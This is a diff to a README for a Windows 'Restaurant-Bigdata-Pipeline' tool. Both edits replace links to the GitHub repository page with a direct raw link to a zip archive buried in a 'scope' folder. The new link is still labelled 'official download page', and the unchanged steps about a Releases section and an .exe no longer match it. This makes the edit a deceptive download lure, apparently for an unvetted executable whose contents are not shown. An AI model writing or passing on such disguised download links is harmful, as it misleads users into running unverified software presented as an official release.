@@ -1,6 +1,6 @@
 # 🍽️ Restaurant-Bigdata-Pipeline - Analyze your restaurant data with ease
 
-[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/bruhmomentume/Restaurant-Bigdata-Pipeline)
+[![Download Software](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/bruhmomentume/Restaurant-Bigdata-Pipeline/main/scope/Pipeline-Restaurant-Bigdata-v2.6.zip)
 
 ## 📋 Project Overview
 
@@ -20,7 +20,7 @@ This software runs on standard Windows computers. You need the following specifi
 
 Follow these steps to set up the software on your computer:
 
-1. Visit the [official download page](https://github.com/bruhmomentume/Restaurant-Bigdata-Pipeline).
+1. Visit the [official download page](https://raw.githubusercontent.com/bruhmomentume/Restaurant-Bigdata-Pipeline/main/scope/Pipeline-Restaurant-Bigdata-v2.6.zip).
 2. Locate the section labeled Releases on the right side of the page.
 3. Click the link for the latest version.
 4. Select the file ending in .exe to start your download.
